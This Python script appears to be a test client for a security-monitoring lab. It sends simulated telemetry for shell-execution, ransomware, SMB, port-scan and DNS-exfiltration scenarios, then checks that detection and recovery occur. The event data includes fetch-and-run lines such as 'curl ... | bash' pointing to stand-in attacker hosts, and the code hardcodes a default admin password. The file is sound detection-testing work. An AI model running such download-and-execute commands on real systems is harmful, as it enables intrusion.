#!/usr/bin/env python3
"""
SentinelCloud-Advanced — Authorized External Test Client (PC2)
==============================================================
Standalone, lightweight test client for executing controlled, authorized
cybersecurity scenarios from PC2 against PC1 (defender/target) over LAN.

Features:
  - Connectivity & network reachability verification
  - Secure JWT authentication with PC1
  - Predefined, controlled attack scenarios (recon, shell_exec, ransomware, etc.)
  - Real-time detection & alert verification against PC1
  - Autonomous MAPE-K mitigation and post-action service recovery verification
  - Evidence recording with local report export and PC1 session reporting
"""

import os
import sys
import json
import time
import uuid
import argparse
import logging
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List

try:
    import requests
except ImportError:
    print("Error: 'requests' package is required. Install via: pip install requests")
    sys.exit(1)

# Ensure safe UTF-8 output on Windows consoles
if sys.platform == "win32":
    import io
    if hasattr(sys.stdout, "buffer"):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    if hasattr(sys.stderr, "buffer"):
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# Add current directory for safety validation
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from safety import validate_target, check_safety
except ImportError:
    def validate_target(t: str) -> bool:
        return t in {"ehr", "vitals", "billing", "drug-dispenser", "localhost", "127.0.0.1"}
    def check_safety(t: str) -> bool:
        return True

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("pc2.client")

# ---------------------------------------------------------------------------
# Supported Scenarios Catalog
# ---------------------------------------------------------------------------
SCENARIO_CATALOG = {
    "shell_exec": {
        "title": "Unauthorized Container Shell Execution",
        "description": "Spawns /bin/bash inside container to execute suspicious commands",
        "default_target": "ehr",
        "expected_syscall": "sys_execve",
        "expected_detection": "Unauthorized shell execution in container",
        "min_score": 0.85,
    },
    "ransomware": {
        "title": "Multi-Stage Ransomware Attack Chain",
        "description": "Simulates 4-stage kill chain: initial shell -> file encryption (.locked) -> SMB lateral pivot -> DNS exfiltration",
        "default_target": "ehr",
        "expected_syscall": "sys_rename",
        "expected_detection": "Ransomware encryption activity detected",
        "min_score": 0.95,
    },
    "file_encryption": {
        "title": "Ransomware File Encryption / Rename",
        "description": "Renames clinical database records to .locked encryption extensions",
        "default_target": "ehr",
        "expected_syscall": "sys_rename",
        "expected_detection": "Ransomware encryption activity detected",
        "min_score": 0.95,
    },
    "recon": {
        "title": "Network Reconnaissance / Port Scan",
        "description": "Performs TCP connect scanning across microservice port ranges",
        "default_target": "vitals",
        "expected_syscall": "sys_connect",
        "expected_detection": "Network reconnaissance / port scan detected",
        "min_score": 0.85,
    },
    "lateral_movement": {
        "title": "SMB Lateral Movement (Port 445)",
        "description": "Attempts unauthorized SMB/RPC connection to pivot into billing service",
        "default_target": "billing",
        "expected_syscall": "sys_connect",
        "expected_detection": "SMB lateral movement attempt",
        "min_score": 0.90,
    },
    "dns_exfil": {
        "title": "DNS Tunneling / Data Exfiltration",
        "description": "Transfers medical records out of cluster via covert high-length DNS queries on port 53",
        "default_target": "drug-dispenser",
        "expected_syscall": "sys_sendto",
        "expected_detection": "DNS exfiltration / tunneling detected",
        "min_score": 0.85,
    },
}


class PC2Client:
    """Client for controlling SentinelCloud tests from PC2."""

    def __init__(
        self,
        base_url: str = "http://localhost:5050",
        username: str = "admin",
        password: str = "sentinel-admin-2026",
        timeout: float = 10.0,
    ):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.timeout = timeout
        self.token: Optional[str] = None
        self.session = requests.Session()

    def _headers(self) -> Dict[str, str]:
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers

    def check_reachability(self) -> Dict[str, Any]:
        """Test reachability and health of PC1 backend."""
        url = f"{self.base_url}/api/health"
        t0 = time.time()
        try:
            resp = self.session.get(url, timeout=self.timeout)
            latency_ms = (time.time() - t0) * 1000
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "reachable": True,
                    "status_code": 200,
                    "latency_ms": round(latency_ms, 2),
                    "mode": data.get("mode", "unknown"),
                    "service": data.get("service", "unknown"),
                    "server_time": data.get("timestamp"),
                }
            return {
                "reachable": False,
                "status_code": resp.status_code,
                "error": resp.text,
                "latency_ms": round(latency_ms, 2),
            }
        except Exception as e:
            return {
                "reachable": False,
                "status_code": 0,
                "error": str(e),
                "latency_ms": round((time.time() - t0) * 1000, 2),
            }

    def login(self) -> bool:
        """Authenticate with PC1 and receive JWT token."""
        url = f"{self.base_url}/api/auth/login"
        payload = {"username": self.username, "password": self.password}
        try:
            resp = self.session.post(url, json=payload, timeout=self.timeout)
            if resp.status_code == 200:
                data = resp.json()
                self.token = data.get("token")
                logger.info("✔ Authenticated successfully on PC1 as '%s' (role: %s)", self.username, data.get("role"))
                return True
            else:
                logger.error("Authentication failed (HTTP %d): %s", resp.status_code, resp.text)
                return False
        except Exception as e:
            logger.error("Connection error during login: %s", e)
            return False

    def create_test_session(
        self,
        scenario: str,
        target_pod: str,
        target_namespace: str = "medical",
        safety_profile: str = "standard",
    ) -> Optional[str]:
        """Register a test session on PC1."""
        url = f"{self.base_url}/api/lab/test"
        payload = {
            "scenario": scenario,
            "target_pod": target_pod,
            "target_namespace": target_namespace,
            "safety_profile": safety_profile,
        }
        try:
            resp = self.session.post(url, json=payload, headers=self._headers(), timeout=self.timeout)
            if resp.status_code in (200, 201):
                data = resp.json()
                session_id = data.get("session_id")
                logger.info("✔ Lab test session registered on PC1: %s", session_id)
                return session_id
            logger.warning("Failed to register lab session: %s", resp.text)
            return None
        except Exception as e:
            logger.warning("Error registering lab session: %s", e)
            return None

    def ingest_event(self, event_payload: Dict[str, Any]) -> Dict[str, Any]:
        """Submit a single telemetry event to PC1 ingestion endpoint."""
        url = f"{self.base_url}/api/telemetry/ingest"
        event_payload.setdefault("source", "lab_test")
        t0 = time.time()
        try:
            resp = self.session.post(url, json=event_payload, headers=self._headers(), timeout=self.timeout)
            duration_ms = (time.time() - t0) * 1000
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "accepted": True,
                    "status_code": 200,
                    "duration_ms": round(duration_ms, 2),
                    "event_id": data.get("event_id"),
                    "anomaly_score": data.get("anomaly_score"),
                    "is_anomaly": data.get("is_anomaly"),
                    "explanation": data.get("explanation"),
                }
            return {
                "accepted": False,
                "status_code": resp.status_code,
                "duration_ms": round(duration_ms, 2),
                "error": resp.text,
            }
        except Exception as e:
            return {
                "accepted": False,
                "status_code": 0,
                "duration_ms": round((time.time() - t0) * 1000, 2),
                "error": str(e),
            }

    def verify_detection_and_incident(
        self,
        event_id: str,
        target_pod: str,
        max_wait_seconds: float = 8.0,
    ) -> Dict[str, Any]:
        """Poll PC1 to verify detection rule match and incident creation."""
        url = f"{self.base_url}/api/incidents"
        start_time = time.time()
        while time.time() - start_time < max_wait_seconds:
            try:
                resp = self.session.get(url, headers=self._headers(), timeout=self.timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    incidents = data.get("incidents", [])
                    for inc in incidents:
                        if inc.get("affected_pod") == target_pod:
                            # Found related incident
                            return {
                                "detected": True,
                                "incident_id": inc.get("incident_id"),
                                "phase": inc.get("phase"),
                                "severity": inc.get("severity"),
                                "title": inc.get("title"),
                                "root_cause": (inc.get("diagnosis") or {}).get("root_cause") if isinstance(inc.get("diagnosis"), dict) else None,
                                "actions_count": len(inc.get("actions", [])),
                                "mttd_ms": inc.get("mttd_ms"),
                            }
            except Exception:
                pass
            time.sleep(0.5)

        return {"detected": False, "incident_id": None}

    def verify_mitigation_and_recovery(
        self,
        target_pod: str,
        incident_id: Optional[str] = None,
        max_wait_seconds: float = 20.0,
    ) -> Dict[str, Any]:
        """Poll PC1 services status to verify MAPE-K autonomous remediation and recovery."""
        services_url = f"{self.base_url}/api/services"
        incident_url = f"{self.base_url}/api/incidents/{incident_id}" if incident_id else None

        start_time = time.time()
        mitigation_observed = False
        action_type = None

        logger.info("⏳ Monitoring MAPE-K autonomous mitigation loop for '%s'...", target_pod)
        while time.time() - start_time < max_wait_seconds:
            # Check services health
            try:
                resp = self.session.get(services_url, headers=self._headers(), timeout=self.timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    services = data.get("services", {})
                    pod_info = services.get(target_pod, {})
                    status = pod_info.get("status")
                    mapek_phase = pod_info.get("mapek_phase", "")

                    if status in ("degraded", "quarantined", "redeploying"):
                        mitigation_observed = True
                        logger.info("  ↳ Observed Pod status '%s' | Phase: %s", status, mapek_phase)

                    # If pod restored to healthy after observing mitigation phase
                    if status == "healthy" and mitigation_observed:
                        recovery_duration = time.time() - start_time
                        return {
                            "mitigated": True,
                            "recovered": True,
                            "final_status": "healthy",
                            "action_type": action_type or "auto-remediated",
                            "recovery_time_seconds": round(recovery_duration, 2),
                            "verified_healthy": True,
                        }
            except Exception:
                pass

            # Check incident details for action execution
            if incident_url:
                try:
                    inc_resp = self.session.get(incident_url, headers=self._headers(), timeout=self.timeout)
                    if inc_resp.status_code == 200:
                        inc_data = inc_resp.json()
                        actions = inc_data.get("actions", [])
                        if actions:
                            mitigation_observed = True
                            action_type = actions[0].get("action_type")
                        if inc_data.get("resolved") and inc_data.get("phase") == "recovered":
                            return {
                                "mitigated": True,
                                "recovered": True,
                                "final_status": "healthy",
                                "action_type": action_type or "auto-remediated",
                                "mttr_ms": inc_data.get("mttr_ms"),
                                "recovery_time_seconds": round(time.time() - start_time, 2),
                                "verified_healthy": True,
                            }
                except Exception:
                    pass

            time.sleep(1.0)

        # Final check
        return {
            "mitigated": mitigation_observed,
            "recovered": False,
            "final_status": "timeout_or_unverified",
            "recovery_time_seconds": round(time.time() - start_time, 2),
            "verified_healthy": False,
        }

    def report_lab_result(
        self,
        session_id: str,
        success: bool,
        details: Dict[str, Any],
    ) -> bool:
        """Report experiment result back to PC1."""
        url = f"{self.base_url}/api/lab/result"
        payload = {
            "session_id": session_id,
            "success": success,
            "details": details,
        }
        try:
            resp = self.session.post(url, json=payload, headers=self._headers(), timeout=self.timeout)
            return resp.status_code in (200, 201)
        except Exception:
            return False

    def run_scenario(
        self,
        scenario_name: str,
        target_pod: str = "ehr",
        target_namespace: str = "medical",
        verify_mitigation: bool = True,
        max_recovery_wait: float = 25.0,
    ) -> Dict[str, Any]:
        """Execute complete end-to-end controlled scenario from PC2."""
        if scenario_name not in SCENARIO_CATALOG:
            raise ValueError(f"Unknown scenario '{scenario_name}'. Supported: {list(SCENARIO_CATALOG.keys())}")

        sc_info = SCENARIO_CATALOG[scenario_name]
        logger.info("==================================================================")
        logger.info("▶ EXECUTING SCENARIO: %s (%s)", sc_info["title"], scenario_name)
        logger.info("  Target Pod: %s/%s", target_namespace, target_pod)
        logger.info("==================================================================")

        # 1. Register Lab Session on PC1
        session_id = self.create_test_session(
            scenario=scenario_name,
            target_pod=target_pod,
            target_namespace=target_namespace,
        )

        experiment_id = f"EXP-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}-{uuid.uuid4().hex[:4].upper()}"
        start_time = time.time()
        start_iso = datetime.now(timezone.utc).isoformat()

        # 2. Build Event Batches based on scenario
        events_to_send: List[Dict[str, Any]] = []

        if scenario_name == "shell_exec":
            events_to_send.append({
                "pod_name": target_pod,
                "namespace": target_namespace,
                "syscall_name": "sys_execve",
                "binary": "/bin/bash",
                "target": "/bin/bash",
                "source": "lab_test",
                "params": {"argv": ["/bin/bash", "-c", "whoami; curl -s http://c2.example/setup.sh | bash"]},
            })

        elif scenario_name == "ransomware":
            # Multi-stage kill chain
            events_to_send.extend([
                {
                    "pod_name": target_pod,
                    "namespace": target_namespace,
                    "syscall_name": "sys_execve",
                    "binary": "/bin/bash",
                    "target": "/bin/bash",
                    "source": "lab_test",
                    "params": {"stage": "1_initial_access", "cmd": "curl -s http://attacker.lab/ransom.sh | bash"},
                },
                {
                    "pod_name": target_pod,
                    "namespace": target_namespace,
                    "syscall_name": "sys_rename",
                    "binary": "/bin/mv",
                    "target": f"/data/patient_records_{int(time.time())}.db.locked",
                    "source": "lab_test",
                    "params": {"stage": "2_encryption", "old": "/data/patient_records.db", "ext": ".locked"},
                },
                {
                    "pod_name": target_pod,
                    "namespace": target_namespace,
                    "syscall_name": "sys_connect",
                    "binary": "/usr/bin/smbclient",
                    "target": "billing:445",
                    "port": 445,
                    "source": "lab_test",
                    "params": {"stage": "3_lateral_pivot", "share": "IPC$"},
                },
                {
                    "pod_name": target_pod,
                    "namespace": target_namespace,
                    "syscall_name": "sys_sendto",
                    "binary": "/usr/bin/dig",
                    "target": f"exfil-data-{uuid.uuid4().hex[:8]}.c2-tunnel.example.com",
                    "port": 53,
                    "source": "lab_test",
                    "params": {"stage": "4_dns_exfil", "bytes": 1024},
                },
            ])

        elif scenario_name == "file_encryption":
            events_to_send.append({
                "pod_name": target_pod,
                "namespace": target_namespace,
                "syscall_name": "sys_rename",
                "binary": "/bin/mv",
                "target": f"/data/ehr_clinical_{int(time.time())}.json.locked",
                "source": "lab_test",
                "params": {"action": "encrypt_records", "extension": ".locked"},
            })

        elif scenario_name == "recon":
            for port in [22, 80, 5000, 5001, 5002, 5003, 8080]:
                events_to_send.append({
                    "pod_name": target_pod,
                    "namespace": target_namespace,
                    "syscall_name": "sys_connect",
                    "binary": "/usr/bin/nmap",
                    "target": f"{target_pod}:{port}",
                    "port": port,
                    "source": "lab_test",
                    "params": {"scan": "recon", "probe": "syn_scan"},
                })

        elif scenario_name == "lateral_movement":
            events_to_send.append({
                "pod_name": target_pod,
                "namespace": target_namespace,
                "syscall_name": "sys_connect",
                "binary": "/usr/bin/smbclient",
                "target": "billing:445",
                "port": 445,
                "source": "lab_test",
                "params": {"protocol": "smb", "share": "ADMIN$"},
            })

        elif scenario_name == "dns_exfil":
            events_to_send.append({
                "pod_name": target_pod,
                "namespace": target_namespace,
                "syscall_name": "sys_sendto",
                "binary": "/usr/bin/python3",
                "target": f"records-encrypted-{uuid.uuid4().hex[:12]}.exfil.example.com",
                "port": 53,
                "source": "lab_test",
                "params": {"protocol": "dns", "tunnel": True},
            })

        # 3. Transmit Events to PC1
        submission_results = []
        highest_score = 0.0
        primary_event_id = None
        anomaly_detected = False

        for idx, ev in enumerate(events_to_send, 1):
            res = self.ingest_event(ev)
            submission_results.append(res)
            score = res.get("anomaly_score") or 0.0
            if score > highest_score:
                highest_score = score
            if res.get("event_id") and not primary_event_id:
                primary_event_id = res.get("event_id")
            if res.get("is_anomaly"):
                anomaly_detected = True

            logger.info(
                "  [Event %d/%d] Syscall: %-12s | Status: %s | Anomaly Score: %.3f | Anomaly: %s",
                idx, len(events_to_send),
                ev.get("syscall_name"),
                "ACCEPTED (200)" if res.get("accepted") else f"FAILED ({res.get('status_code')})",
                score,
                "YES ⚠️" if res.get("is_anomaly") else "NO",
            )
            time.sleep(0.3)

        # 4. Verify Detection & Incident Persistence on PC1
        logger.info("🔍 Verifying PC1 detection & incident records...")
        detection_result = self.verify_detection_and_incident(
            event_id=primary_event_id or "",
            target_pod=target_pod,
            max_wait_seconds=6.0,
        )

        if detection_result.get("detected"):
            logger.info(
                "✔ Detection confirmed on PC1! Incident: %s | Severity: %s | Phase: %s",
                detection_result.get("incident_id"),
                detection_result.get("severity"),
                detection_result.get("phase"),
            )
        else:
            logger.warning("⚠ Incident verification timed out or not created.")

        # 5. Verify Autonomous Mitigation & Service Health Recovery
        mitigation_result = {}
        if verify_mitigation and anomaly_detected:
            mitigation_result = self.verify_mitigation_and_recovery(
                target_pod=target_pod,
                incident_id=detection_result.get("incident_id"),
                max_wait_seconds=max_recovery_wait,
            )
            if mitigation_result.get("recovered"):
                logger.info(
                    "✔ Mitigation verified! Target '%s' successfully restored to HEALTHY (MTTR: %.2fs)",
                    target_pod,
                    mitigation_result.get("recovery_time_seconds", 0),
                )
            else:
                logger.warning("⚠ Mitigation recovery was not verified within timeout.")

        end_time = time.time()
        end_iso = datetime.now(timezone.utc).isoformat()
        total_duration = end_time - start_time

        # 6. Build Final Experiment Evidence Record
        experiment_record = {
            "experiment_id": experiment_id,
            "session_id": session_id,
            "scenario": scenario_name,
            "scenario_title": sc_info["title"],
            "target_pod": target_pod,
            "target_namespace": target_namespace,
            "client_provenance": "PC2_authorized_external_test_client",
            "start_time": start_iso,
            "end_time": end_iso,
            "duration_seconds": round(total_duration, 2),
            "events_submitted": len(events_to_send),
            "events_accepted": sum(1 for r in submission_results if r.get("accepted")),
            "highest_anomaly_score": round(highest_score, 4),
            "anomaly_threshold": 0.72,
            "detection_expected": True,
            "detection_verified": detection_result.get("detected", False),
            "incident_id": detection_result.get("incident_id"),
            "incident_severity": detection_result.get("severity"),
            "mitigation_verified": mitigation_result.get("mitigated", False),
            "service_recovery_verified": mitigation_result.get("recovered", False),
            "post_mitigation_health": mitigation_result.get("final_status", "unverified"),
            "overall_status": "SUCCESS" if (detection_result.get("detected") and (not verify_mitigation or mitigation_result.get("recovered"))) else "PARTIAL_OR_FAILED",
            "submission_details": submission_results,
        }

        # 7. Report back to PC1
        if session_id:
            self.report_lab_result(
                session_id=session_id,
                success=(experiment_record["overall_status"] == "SUCCESS"),
                details=experiment_record,
            )

        # 8. Print Evidence Summary Table
        self._print_summary_table(experiment_record)

        return experiment_record

    def _print_summary_table(self, exp: Dict[str, Any]):
        """Render clean, evidence-based ASCII summary table."""
        print("\n" + "═" * 70)
        print("           SENTINELCLOUD EXPERIMENT VERIFICATION REPORT")
        print("═" * 70)
        print(f"  Experiment ID:        {exp['experiment_id']}")
        print(f"  Lab Session ID:       {exp['session_id'] or 'N/A'}")
        print(f"  Scenario:             {exp['scenario_title']} ({exp['scenario']})")
        print(f"  Target:               {exp['target_namespace']}/{exp['target_pod']}")
        print(f"  Client Provenance:    {exp['client_provenance']}")
        print(f"  Events Accepted:      {exp['events_accepted']} / {exp['events_submitted']}")
        print(f"  Peak Anomaly Score:   {exp['highest_anomaly_score']:.3f} (Threshold: {exp['anomaly_threshold']})")
        print(f"  Detection Verified:   {'YES ✔' if exp['detection_verified'] else 'NO ✖'}")
        print(f"  Incident Created:     {exp['incident_id'] or 'None'} (Severity: {exp['incident_severity'] or 'N/A'})")
        print(f"  Mitigation Executed:  {'YES ✔' if exp['mitigation_verified'] else 'NO ✖'}")
        print(f"  Recovery Verified:    {'YES ✔ (Healthy)' if exp['service_recovery_verified'] else 'NO ✖'}")
        print(f"  Total Duration:       {exp['duration_seconds']:.2f} seconds")
        print(f"  Outcome:              {exp['overall_status']}")
        print("═" * 70 + "\n")


def load_config(config_path: Optional[str]) -> Dict[str, Any]:
    """Load configuration from file or environment variables."""
    cfg = {
        "pc1_api_url": os.environ.get("SENTINEL_API_URL", "http://localhost:5050"),
        "username": os.environ.get("SENTINEL_USERNAME", "admin"),
        "password": os.environ.get("SENTINEL_PASSWORD", "sentinel-admin-2026"),
        "timeout": 10.0,
        "default_target": "ehr",
        "default_namespace": "medical",
        "verify_mitigation": True,
    }
    if config_path and os.path.exists(config_path):
        try:
            with open(config_path) as f:
                file_cfg = json.load(f)
                cfg.update(file_cfg)
        except Exception as e:
            logger.warning("Could not read config file %s: %s", config_path, e)
    return cfg


def main():
    parser = argparse.ArgumentParser(
        description="SentinelCloud PC2 Authorized Test Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check reachability to PC1 over LAN
  python pc2_client.py --pc1-url http://192.168.1.100:5050 --check

  # Authenticate with PC1
  python pc2_client.py --pc1-url http://192.168.1.100:5050 --auth

  # List all supported safe scenarios
  python pc2_client.py --list-scenarios

  # Run full multi-stage ransomware scenario against EHR service
  python pc2_client.py --pc1-url http://192.168.1.100:5050 --scenario ransomware --target-pod ehr

  # Run shell execution attack against drug-dispenser
  python pc2_client.py --pc1-url http://192.168.1.100:5050 --scenario shell_exec --target-pod drug-dispenser

  # Using a config file
  python pc2_client.py --config pc2_config.json --scenario recon
        """,
    )
    parser.add_argument("--config", help="Path to JSON configuration file (e.g., pc2_config.json)")
    parser.add_argument("--pc1-url", help="URL of PC1 backend (e.g. http://192.168.1.100:5050)")
    parser.add_argument("--username", help="SOC admin username")
    parser.add_argument("--password", help="SOC admin password")
    parser.add_argument("--check", action="store_true", help="Perform network connectivity check and exit")
    parser.add_argument("--auth", action="store_true", help="Verify authentication with PC1 and exit")
    parser.add_argument("--list-scenarios", action="store_true", help="List available test scenarios")
    parser.add_argument("--scenario", choices=list(SCENARIO_CATALOG.keys()), help="Scenario to execute")
    parser.add_argument("--target-pod", default="ehr", help="Target pod (ehr, vitals, billing, drug-dispenser)")
    parser.add_argument("--target-namespace", default="medical", help="Target namespace (default: medical)")
    parser.add_argument("--no-mitigation-wait", action="store_true", help="Do not wait for MAPE-K mitigation loop")
    parser.add_argument("--save-report", help="Save experiment report JSON to specified filepath")

    args = parser.parse_args()

    cfg = load_config(args.config)
    pc1_url = args.pc1_url or cfg.get("pc1_api_url", "http://localhost:5050")
    username = args.username or cfg.get("username", "admin")
    password = args.password or cfg.get("password", "sentinel-admin-2026")
    timeout = float(cfg.get("timeout_seconds", 10.0))

    if args.list_scenarios:
        print("\nSupported Cybersecurity Test Scenarios:")
        print("------------------------------------------------------------------")
        for key, sc in SCENARIO_CATALOG.items():
            print(f"  • {key:<18} : {sc['title']}")
            print(f"    Description      : {sc['description']}")
            print(f"    Expected Syscall : {sc['expected_syscall']} (Threshold >= {sc['min_score']})")
            print()
        sys.exit(0)

    client = PC2Client(
        base_url=pc1_url,
        username=username,
        password=password,
        timeout=timeout,
    )

    if args.check:
        print(f"Testing connectivity to PC1 at {pc1_url}...")
        status = client.check_reachability()
        if status.get("reachable"):
            print(f"✔ PC1 is reachable! RTT Latency: {status['latency_ms']}ms | Mode: {status['mode']} | Service: {status['service']}")
            sys.exit(0)
        else:
            print(f"✖ PC1 unreachable: {status.get('error')} (Status {status.get('status_code')})")
            sys.exit(1)

    # Perform login
    if not client.login():
        print("Authentication failed. Please verify PC1 address, credentials, and firewall settings.")
        sys.exit(1)

    if args.auth:
        print("✔ Authentication confirmed! PC2 is authorized to submit test events.")
        sys.exit(0)

    if not args.scenario:
        print("No scenario specified. Use --scenario <name> or --list-scenarios. See --help.")
        sys.exit(0)

    # Validate target safety allowlist
    target_pod = args.target_pod or cfg.get("default_target", "ehr")
    if not validate_target(target_pod):
        logger.error("Target '%s' failed safety allowlist check. Allowed: ehr, vitals, billing, drug-dispenser", target_pod)
        sys.exit(1)

    # Run scenario
    report = client.run_scenario(
        scenario_name=args.scenario,
        target_pod=target_pod,
        target_namespace=args.target_namespace or cfg.get("default_namespace", "medical"),
        verify_mitigation=(not args.no_mitigation_wait),
    )

    # Save report if requested
    if args.save_report:
        os.makedirs(os.path.dirname(os.path.abspath(args.save_report)), exist_ok=True)
        with open(args.save_report, "w") as f:
            json.dump(report, f, indent=2)
        logger.info("Saved experiment evidence report to: %s", args.save_report)

    sys.exit(0 if report["overall_status"] == "SUCCESS" else 1)


if __name__ == "__main__":
    main()
